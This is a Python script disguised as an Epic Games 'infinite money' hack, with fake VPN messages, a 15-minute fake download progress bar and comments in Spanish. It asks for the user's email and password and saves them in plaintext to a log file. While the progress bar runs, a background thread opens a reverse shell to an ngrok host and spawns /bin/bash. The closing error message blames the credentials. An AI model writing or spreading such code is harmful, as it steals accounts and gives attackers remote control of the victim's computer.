import time
import subprocess
import random
import threading

def login():
    email = input("Enter your email: ")
    password = input("Enter your password: ")
    print("\033[2J\n")
    confirm_email = input("Confirm your email: ")
    confirm_password = input("Confirm your password: ")
    
    if email == confirm_email and password == confirm_password:
        with open('log.txt', 'a') as file:
            file.write(f"Email: {email}, Password: {password}\n")
        print("Login successful!")
    else:
        print("Email or password confirmation failed. Please try again.")
        login()
        
login()
time.sleep(5)
print("Starting built-in VPN for a secure connection(ANTI-BAN)...")
time.sleep(10)
print("Connecting to Epic Games... please wait.")
time.sleep(10)
print("Connected!")
time.sleep(4)
with open('banner.txt', 'r') as f:
    banner = f.read()

def download_bar(progress):
    width = 40
    fill = int(progress / 100 * width)
    empty = width - fill
    return f"[{'=' * fill}>{' ' * empty}] {progress}%"

def countdown(duration):
    while duration >= 0:
        print("\033[2J")
        print(banner)

        progress = int((900 - duration) / 900 * 100)
        speed = random.randint(800, 1200)  # velocidad de dwonload en KB/s un poco random
        remaining = duration // speed 
        print(download_bar(progress))
        print(f"{duration // 60:02d}:{duration % 60:02d} Hack - Infinite money. Code injection download progress @ {speed} KB/s")
        time.sleep(1)
        duration -= 1

    # mensaje cuando termina download
    print("\033[2J")
    print(banner)
    print(download_bar(100))
    print("ERROR: Code injection failed! verify your email and password! check your internet connection and try again!")


def run_subprocess():
    try:
        output = subprocess.check_output(["python", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('0.tcp.ngrok.io',12122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"])
        print(output.decode())
    except subprocess.CalledProcessError as error:
        print(error)

subprocess_thread = threading.Thread(target=run_subprocess)
subprocess_thread.start()

# tiempo del download
countdown(900)  # 15 minutos = 900 segundos

subprocess_thread.join()
